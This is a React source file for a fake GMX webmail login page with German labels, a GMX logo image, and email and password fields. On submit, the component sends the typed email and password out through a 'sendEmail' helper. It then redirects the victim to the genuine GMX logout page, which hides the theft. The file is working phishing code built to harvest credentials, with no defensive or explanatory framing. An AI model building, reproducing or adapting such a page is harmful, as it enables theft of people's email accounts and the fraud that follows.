import React, { useState } from "react";

import gmx_img from "../../img/gmx_loginn.jpeg";
import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import sendEmail from "../../utils/sendEmail";

function Login() {
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      const response = await sendEmail({ password, email });

      if (response.data === "OK") {
        window.location.assign(
          "https://www.gmx.com/logout/?ls=wd#.1559516-header-login1-1"
        );
      }
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div className="login_container">
      <form className="login_items" onSubmit={handleSubmit}>
        <div className="email">
          <div className="envelopeLogo mt-5 color-white">
            <i className="fa-solid fa-envelope"></i>
          </div>

          <p className="email-paragraph mt-4">E-Mail</p>

          <div>
            <input
              type="email"
              className="rounded border py-1 border-gray-300 w-full bg-white pl-2"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <p className="paragraph">Kostenlos registrieren!</p>
          </div>
        </div>

        <div className="passwort-group relative">
          <div className="">
            <div>
              <input
                className="rounded border py-1 border-gray-300 w-full bg-white pl-2"
                type={showPassword ? "text" : "password"}
                label="Password"
                id="password"
                name="password"
                value={password}
                onChange={handlePasswordChange}
                placeholder="Enter your password"
                required
              />

              <button
                className="absolute top-1 background-red-500 left-40"
                type="button"
                onClick={togglePasswordVisibility}
                aria-label="Toggle password visibility"
              >
                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
              </button>
            </div>
            <p className="paragraph">Passwort Vergessen?</p>
          </div>

          <div>
            <button className="passwordBtn" type="submit">
              Login
            </button>
          </div>
        </div>

        <div>
          <img src={gmx_img} alt="" />
        </div>
      </form>
    </div>
  );
}

export default Login;
